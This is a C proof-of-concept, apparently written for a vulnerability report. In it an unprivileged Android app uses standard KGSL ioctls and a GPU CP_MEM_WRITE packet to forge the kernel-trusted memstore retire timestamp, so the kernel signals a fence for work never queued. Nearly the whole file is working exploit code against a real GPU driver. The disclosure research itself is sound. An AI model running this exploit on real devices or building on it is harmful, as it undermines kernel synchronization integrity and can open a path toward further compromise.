/* probe_fence.c - Demonstrating that a kernel-trusted GPU synchronization
 * state buffer (the KGSL "memstore") can be written by a non-privileged
 * GPU submission, and that the kernel then accepts that forged value as the
 * authoritative "work has retired" state.
 *
 * No root, no special permissions, no non-public interfaces: only standard
 * kgsl ioctls (alloc / create context / submit command / timestamp event)
 * plus mmap, from an ordinary third-party app uid.
 *
 * See the report in ../README.md for the mechanism, the scope, and the
 * explicitly ruled-out claims.
 *
 * Design notes that make this work at all:
 *   Three contexts are used, one per role.
 *     ctx_forg - only submits a single CP_MEM_WRITE. The GPU overwrites this
 *                context's own retire field as a side effect of the
 *                submission, which is harmless because its value is never
 *                consumed.
 *     ctx_exp  - the experiment arm: submits one NOP retiring at T, then
 *                submits nothing else, so the forged value stays in place.
 *     ctx_ctl  - the control arm: submits one NOP retiring at T', never
 *                forged.
 *   Sharing one context between the forger and the target is not possible:
 *   the act of submitting the CP_MEM_WRITE makes the GPU rewrite that
 *   context's own retire field and overwrite the forged value.
 *
 * What to expect:
 *   experiment arm poll() -> POLLIN   (fence signalled)
 *   control arm      poll() -> 0      (timed out)
 *   The target timestamp (T + 4096) was never queued to the GPU, so its
 *   retire counter never reached that value. The kernel signalling anyway is
 *   the whole point.
 *   If both arms return -22 (EINVAL), the CONFIG_SYNC_FILE path was not
 *   compiled in on this kernel: the very first 0x33 call is a safe way to
 *   probe for that, because that path returns -EINVAL before dereferencing
 *   anything.
 *
 * Build: aarch64-alpine-linux-musl-gcc -static -O2 -o probe_fence probe_fence.c
 * Run on-device as a normal app. This binary deliberately uses raw syscalls
 * and no libc, so it can be pushed to a device and executed without any
 * runtime dependencies.
 */

#include <stdint.h>
#include <string.h>

#define SYS_write    1
#define SYS_unlink   10
#define SYS_openat   56
#define SYS_close    57
#define SYS_ioctl    29
#define SYS_mmap     222
#define SYS_nanosleep 101
#define SYS_ppoll    73
#define AT_FDCWD    (-100)
#define O_RDWR       2
#define O_WRONLY     1
#define O_CREAT      0x40
#define O_TRUNC      0x200
#define PROT_READ    1
#define PROT_WRITE   2
#define MAP_SHARED   1
#define MAP_FIXED    0x10
#define POLLIN       0x0001

typedef long (*svc_t)(long, long, long, long, long, long, long);
static long rs6(long nr, long a, long b, long c, long d, long e, long f) {
    register long x8 __asm__("x8") = nr;
    register long x0 __asm__("x0") = a;
    register long x1 __asm__("x1") = b;
    register long x2 __asm__("x2") = c;
    register long x3 __asm__("x3") = d;
    register long x4 __asm__("x4") = e;
    register long x5 __asm__("x5") = f;
     /* The register bindings tell GCC which of x8/x0..x5 belong to the
     * syscall ABI, so it will not allocate an input operand there.
     * Constraint: every rs6() argument must be a pure expression with no
     * nested calls. strlen() and friends would clobber x8, which carries
     * the syscall number. say() below computes its own length for that
     * reason. A "mov xN, ..." variant does not work: GCC does not know
     * that a mov clobbers x0-x5, so it reuses those registers for the
     * inputs and they overwrite each other (observed: an openat path
     * argument arriving as -100).*/
    __asm__ volatile(
        "svc #0"
        : "+r"(x0)
        : "r"(x8), "r"(x1), "r"(x2), "r"(x3), "r"(x4), "r"(x5)
        : "cc", "memory");
    return x0;
}
static long out_fd = -1;

/* Results are written to a file rather than stdout. A statically linked
 * binary executed directly on a device is not attached to a readable stdout,
 * so everything is logged to /data/local/tmp/pf.res and the shell reads it
 * afterwards. The exit code carries the same result as a bit field, as a
 * fallback channel. */
static void open_out(void) {
    rs6(SYS_unlink, AT_FDCWD, (long)"/data/local/tmp/pf.res", 0, 0, 0, 0);
    out_fd = rs6(SYS_openat, AT_FDCWD, (long)"/data/local/tmp/pf.res",
                 O_WRONLY | O_CREAT | O_TRUNC, 0666, 0, 0);
}

static void say(const char *s) {
    long n = 0;
    while (s[n]) n++;
    long wf = (out_fd >= 0) ? out_fd : 1;
    rs6(SYS_write, wf, (long)s, n, 0, 0, 0);
}
static void sl(int n) { char b[24]; int i = 0; int neg = 0;
    if (n < 0) { neg = 1; if ((long)n < -2147483647L) { say("-2147483647"); return; } n = -n; }
    b[23] = 0;
    if (n == 0) b[i++] = '0';
    while (n > 0 && i < 22) { b[i++] = '0' + (n % 10); n /= 10; }
    if (neg) b[i++] = '-';
    char out[24]; int j = 0;
    while (i > 0) out[j++] = b[--i];
    out[j] = 0;
    say(out);
}
static void sx(long v) { char b[18]; int i = 0;
    b[17] = 0; b[i++] = '0'; b[i++] = 'x';
    for (int k = 28; k >= 0; k -= 4) { int d = (int)((v >> k) & 0xf);
        b[i++] = d < 10 ? '0' + d : 'a' + d - 10; }
    say(b);
}
static void kv(const char *k, long v) { say(k); sl((int)v); say("\n"); }
static void kvh(const char *k, long v) { say(k); sx(v & 0xffffffffL); say("\n"); }
static void kvs(const char *s) { say(s); say("\n"); }
static void slp(int ms) { long ts[2]; ts[0] = ms / 1000; ts[1] = (long)(ms % 1000) * 1000000L;
    rs6(SYS_nanosleep, (long)ts, 0, 0, 0, 0, 0); }

#define KGSL_IOC_TYPE 0x09
#define KIOC(nr, size) \
    ((uint32_t)((3u << 30) | ((uint32_t)(size) << 16) | ((KGSL_IOC_TYPE) << 8) | (uint32_t)(nr)))
#define CMD_DRAWCTXT_CREATE KIOC(0x13, 8)
#define CMD_GPUMEM_ALLOC_ID KIOC(0x34, 48)
#define CMD_GPU_COMMAND     KIOC(0x4A, 64)
#define CMD_READTS          KIOC(0x16, 12)
#define CMD_TSEVENT         KIOC(0x33, 32)

#define KGSL_MEMFLAGS_USE_CPU_MAP (1ULL << 28)
#define KGSL_MEMFLAGS_IOCOHERENT  (1ULL << 31)
#define KGSL_CMDLIST_IB            0x1u
#define KGSL_CONTEXT_NO_GMEM_ALLOC 0x00000002u
#define KGSL_CONTEXT_PREAMBLE      0x00000010u
#define KGSL_CONTEXT_USER_TS       0x00000080u

struct kgsl_gpumem_alloc_id {
    uint32_t id; uint32_t flags; uint64_t size;
    uint64_t mmapsize; uint64_t gpuaddr; uint64_t __pad[2];
};                                   /* 48 */
struct kgsl_drawctxt_create { uint32_t flags; uint32_t drawctxt_id; };
struct kgsl_command_object {
    uint64_t offset; uint64_t gpuaddr; uint64_t size; uint32_t flags; uint32_t id;
};                                   /* 32 */
struct kgsl_gpu_command {
    uint64_t flags, cmdlist; uint32_t cmdsize, numcmds;
    uint64_t objlist; uint32_t objsize, numobjs;
    uint64_t synclist; uint32_t syncsize, numsyncs;
    uint32_t context_id, timestamp;
};                                   /* 64 */
struct kgsl_readts_ctxtid {
    uint32_t context_id; uint32_t type; uint32_t timestamp;
};
/* type; timestamp; context_id; pad; priv; len = 32 */
struct kgsl_timestamp_event {
    uint32_t type; uint32_t timestamp; uint32_t context_id; uint32_t __pad;
    void *priv; uint64_t len;
};
struct kgsl_timestamp_event_fence { int fence_fd; };

#define CP_TYPE7_PKT (7u << 28)
#define CP_MEM_WRITE 0x3d
#define CP_NOP       0x10
static uint32_t pm4_parity(uint32_t v) {
    return (0x9669u >> (0xf & (v ^ (v >> 4) ^ (v >> 8) ^ (v >> 12) ^
                              (v >> 16) ^ (v >> 20) ^ (v >> 24) ^ (v >> 28)))) & 1u;
}
static uint32_t pkt(uint32_t op, uint32_t cnt) {
    return CP_TYPE7_PKT | (cnt & 0x3fffu) | (pm4_parity(cnt) << 15) |
           ((op & 0x7fu) << 16) | (pm4_parity(op) << 23);
}

static long fd = -1;
static uint64_t buf_va = 0;
static volatile uint32_t *buf = 0;
static long ms_cpu = 0;
static uint64_t g_ms_va = 0;
static long ctx_forg = -1, ctx_exp = -1, ctx_ctl = -1;

static uint64_t ms_va(void) { return g_ms_va; }

static long do_ioctl(long nr, void *p) {
    long r = rs6(SYS_ioctl, fd, (long)nr, (long)p, 0, 0, 0);
    return r < 0 ? r : 0;
}

/* create a draw context */
static long mkctx(uint32_t flags) {
    struct kgsl_drawctxt_create c; memset(&c, 0, sizeof c);
    c.flags = flags;
    long r = do_ioctl(CMD_DRAWCTXT_CREATE, &c);
    if (r < 0) return r;
    return (long)c.drawctxt_id;
}

/* submit buffer[off, off+size) as an instruction buffer */
static long submit(int ctx, uint32_t off, uint32_t size, uint32_t ts) {
    struct kgsl_command_object obj; memset(&obj, 0, sizeof obj);
    obj.offset  = 0;
    obj.gpuaddr = buf_va + off;
    obj.size    = size;
    obj.flags   = KGSL_CMDLIST_IB;
    struct kgsl_gpu_command cmd; memset(&cmd, 0, sizeof cmd);
    cmd.cmdlist = (uint64_t)(uintptr_t)&obj;
    cmd.cmdsize = sizeof(obj);
    cmd.numcmds = 1;
    cmd.context_id = (uint32_t)ctx;
    cmd.timestamp  = ts;
    long r = do_ioctl(CMD_GPU_COMMAND, &cmd);
    return r < 0 ? r : 0;
}

/* fill NOPs starting at off */
static void fillnop(uint32_t off, uint32_t dwords) {
    volatile uint32_t *p = buf + off / 4;
    int i = 0;
    while (i + 1 < (int)dwords) {
        int n = (int)dwords - i - 1;
        if (n > 0x3fff) n = 0x3fff;
        p[i++] = pkt(CP_NOP, (uint32_t)n);
        for (int k = 0; k < n && i < (int)dwords; k++) p[i++] = 0;
    }
}

/* read a timestamp; 2 = RETIRED (end/retire timestamp) */
static long readts(int ctx, int type) {
    struct kgsl_readts_ctxtid a; memset(&a, 0, sizeof a);
    a.context_id = (uint32_t)ctx;
    a.type = (uint32_t)type;
    long r = do_ioctl(CMD_READTS, &a);
    if (r < 0) return r;
    return (long)a.timestamp;
}

/* forge the end timestamp of memstore slot(ctx) (field +8) via CP_MEM_WRITE */
static long forge(int ctx_forg, int slot, uint32_t value) {
    uint64_t target = (uint64_t)ms_va() + (uint64_t)(uint32_t)slot * 40u + 8u;
    volatile uint32_t *p = buf;
    p[0] = pkt(CP_MEM_WRITE, 3);
    p[1] = (uint32_t)(target & 0xffffffffu);
    p[2] = (uint32_t)(target >> 32);
    p[3] = value;
     /* USER_GENERATED_TS makes queued timestamps strictly increasing
     * (adreno_dispatch.c:1400-1407). Passing 0 collides with the context's
     * initial timestamp of 0 and fails with -ERANGE. */
    return submit(ctx_forg, 0, 16, 1);
}

/* 0x33 TIMESTAMP_EVENT, type=2 (FENCE). Returns 0 on success, otherwise
 * the negative errno. On success *outfd is a sync_file fd created by the
 * kernel, pollable for completion. */
static long fence(int ctx, uint32_t ts, int *outfd) {
    struct kgsl_timestamp_event_fence fev; memset(&fev, 0, sizeof fev);
    fev.fence_fd = -1;
    struct kgsl_timestamp_event e; memset(&e, 0, sizeof e);
    e.type = 2;                       /* KGSL_TIMESTAMP_EVENT_FENCE */
    e.timestamp = ts;
    e.context_id = (uint32_t)ctx;
    e.priv = &fev;
    e.len = sizeof(fev);              /* = 4; must match the kernel's sizeof(priv) check */
    long r = do_ioctl(CMD_TSEVENT, &e);
    if (r < 0) { *outfd = -1; return r; }
    *outfd = fev.fence_fd;
    return 0;
}

/* Two traps here. First, aarch64 has no poll syscall: 7 is an unrelated
 * call, which strace decodes as fsetxattr. musl implements poll() as
 * ppoll (73), whose third argument is a struct timespec *, not an int
 * millisecond count. Second, struct pollfd.fd must be a 32-bit int;
 * declaring it long makes the struct 12 bytes and it no longer matches
 * the kernel layout. */
struct pf { int fd; short events; short revents; };
struct pts { long tv_sec; long tv_nsec; };
static long do_poll(long pfd, long n, long to_ms) {
    struct pts t;
    t.tv_sec = to_ms / 1000;
    t.tv_nsec = (to_ms % 1000) * 1000000L;
    return rs6(SYS_ppoll, pfd, n, (long)&t, 0, 0, 0);
}

static long open_dev(void) {
    long f = rs6(SYS_openat, AT_FDCWD, (long)"/dev/kgsl-3d0", O_RDWR, 0, 0, 0);
    if (f < 0) { kv("open", f); return -1; }
    fd = f;
    kv("open_ok", (int)f);
    return 0;
}

static long alloc_buf(uint32_t sz) {
    struct kgsl_gpumem_alloc_id a; memset(&a, 0, sizeof a);
    a.size = sz;
    a.flags = (uint32_t)(KGSL_MEMFLAGS_USE_CPU_MAP | KGSL_MEMFLAGS_IOCOHERENT);
    long r = do_ioctl(CMD_GPUMEM_ALLOC_ID, &a);
    if (r < 0) { kv("alloc_id", r); return -1; }
    if ((uint64_t)a.gpuaddr != 0) { kvs("alloc: gpuaddr!=0 (not SVM)"); return -1; }
    unsigned long ml = (unsigned long)(a.mmapsize ? a.mmapsize : a.size);
    long p = rs6(SYS_mmap, 0, (long)ml, PROT_READ | PROT_WRITE, MAP_SHARED, fd, (long)((uint64_t)a.id << 12));
    if (p < 0 && p > -4096) { kv("mmap_buf", p); return -1; }
    buf_va = (uint64_t)p;
    buf = (volatile uint32_t *)p;
    kvh("buf_va", (long)p);
    kv("buf_id", (int)a.id);
    return 0;
}

static long map_ms(void) {
    long p = rs6(SYS_mmap, 0, 32768, PROT_READ, MAP_SHARED, fd, 0xfff00000L);
    if (p < 0 && p > -4096) { kv("mmap_ms", p); return -1; }
    ms_cpu = p;
    g_ms_va = 0xfc000000ULL;          /* measured on the reference device: memstore GPU VA = 0xfc000000 */
    kvs("ms_mapped");
    return 0;
}

int main(int argc, char **argv) {
    int mode = 0;
    if (argc > 1) {
        mode = 0;
        for (int i = 0; argv[1][i]; i++) mode = mode * 10 + (argv[1][i] - '0');
    }

    open_out();
    kvs("=== probe_fence (0x33 TIMESTAMP_EVENT fence) ===");
    if (open_dev()) return 1;
    if (alloc_buf(65536)) return 1;
    if (map_ms()) return 1;

    uint32_t flags = KGSL_CONTEXT_NO_GMEM_ALLOC | KGSL_CONTEXT_PREAMBLE | KGSL_CONTEXT_USER_TS;
    kvs("--- create contexts (flags=0x92) ---");
    ctx_forg = mkctx(flags);
    kv("ctx_forg", ctx_forg);
    if (ctx_forg < 0) { kvs("ABORT: context flags rejected"); return 1; }
    ctx_exp = mkctx(flags);
    kv("ctx_exp ", ctx_exp);
    ctx_ctl = mkctx(flags);
    kv("ctx_ctl ", ctx_ctl);
    if (ctx_exp < 0 || ctx_ctl < 0) { kvs("ABORT"); return 1; }

    fillnop(0x100, 1024);             /* NOPs from 0x100; first 0x100 reserved for CP_MEM_WRITE */
    kv("nop_fill", 1);

    int bits = 0;   /* result bitmap, also encoded in the exit code as a fallback output
                        channel
                        0x40 = experiment arm 0x33 succeeded
                        0x80 = control arm 0x33 succeeded
                        0x20 = forged value observed from the CPU side
                        0x08 = forged value still resident after the fence
                        0x10 = experiment arm fence signalled (POLLIN)
                        0x01 = control arm fence signalled (expected 0)
                        expected on success = 0xF8 (248) */

    /* ============ experiment arm ============ */
    long T = 100;
    long tgt = T + 4096;
    kvs("--- EXP ARM ---");
    long r1 = submit(ctx_exp, 0x100, 4096, T);
    kv("submit_exp", r1);
    slp(300);
    long e1 = readts(ctx_exp, 2);
    kv("eopt_exp_pre", (int)e1);

    if (mode != 2) {
        long fr = forge(ctx_forg, ctx_exp, (uint32_t)tgt);
        kv("forge", fr);
        slp(300);
        long e2 = readts(ctx_exp, 2);
        kv("eopt_exp_post", (int)e2);
        if ((long)e2 == tgt) bits |= 0x20;
        else kvs("WARN: forge not observed");
    }

    if (mode != 1) {
        int f1 = -1;
        long r2 = fence(ctx_exp, (uint32_t)tgt, &f1);
        kv("fence_ret", r2);
        kv("fence_fd", (int)f1);
        if (r2 == 0) bits |= 0x40;
        /* Decisive diagnostic: read the end timestamp again after the
         * fence call.
         *   still == tgt -> kgsl_readtimestamp() inside 0x33 saw the same
         *                   forged value yet still took the pending branch,
         *                   so the decision is not fed by this source
         *                   (contradiction, needs a deeper look)
         *   different  -> the end timestamp was overwritten by the GPU or
         *                  the driver around the fence call */
        long e3 = readts(ctx_exp, 2);
        kv("eopt_after_fence", (int)e3);
        if ((long)e3 == tgt) bits |= 0x08;
        if (r2 == 0 && f1 >= 0) {
            struct pf p; memset(&p, 0, sizeof p);
            p.fd = f1;
            p.events = POLLIN;
            long pr = do_poll((long)&p, 1, 2000);
            kv("poll_exp_ret", pr);
            kv("poll_exp_rev", (int)p.revents);
            if (p.revents & POLLIN) bits |= 0x10;
            rs6(SYS_close, f1, 0, 0, 0, 0, 0);
        }
    }

    /* ============ control arm ============ */
    long T2 = 200;
    long tgt2 = T2 + 4096;
    kvs("--- CTL ARM ---");
    long r3 = submit(ctx_ctl, 0x100, 4096, T2);
    kv("submit_ctl", r3);
    slp(300);
    long e3 = readts(ctx_ctl, 2);
    kv("eopt_ctl", (int)e3);

    int f2 = -1;
    long r4 = fence(ctx_ctl, (uint32_t)tgt2, &f2);
    kv("fence_ret", r4);
    kv("fence_fd", (int)f2);
    if (r4 == 0) bits |= 0x80;
    if (r4 == 0 && f2 >= 0) {
        struct pf p; memset(&p, 0, sizeof p);
        p.fd = f2;
        p.events = POLLIN;
        long pr = do_poll((long)&p, 1, 400);
        kv("poll_ctl_ret", pr);
        kv("poll_ctl_rev", (int)p.revents);
        if (p.revents & POLLIN) bits |= 0x01;
        rs6(SYS_close, f2, 0, 0, 0, 0, 0);
    }

    kvs("--- readback slots ---");
    if (ms_cpu) {
        volatile uint32_t *w = (volatile uint32_t *)ms_cpu;
        for (int c = 1; c <= 8; c++) {
            say("slot"); sl(c); say(" sopt="); sl((int)w[c * 10 + 0]);
            say(" eopt="); sl((int)w[c * 10 + 2]); say("\n");
        }
        say("rb814 sopt="); sl((int)w[814 * 10]);
        say(" eopt="); sl((int)w[814 * 10 + 2]);
        say("  rb817 sopt="); sl((int)w[817 * 10]);
        say(" eopt="); sl((int)w[817 * 10 + 2]); say("\n");
    }
    kvs("=== RESULT_BITS ===");
    kv("decimal", bits);
    sx(bits);
    kvs("=== DONE ===");
    rs6(SYS_close, fd, 0, 0, 0, 0, 0);
    return (int)bits;
}

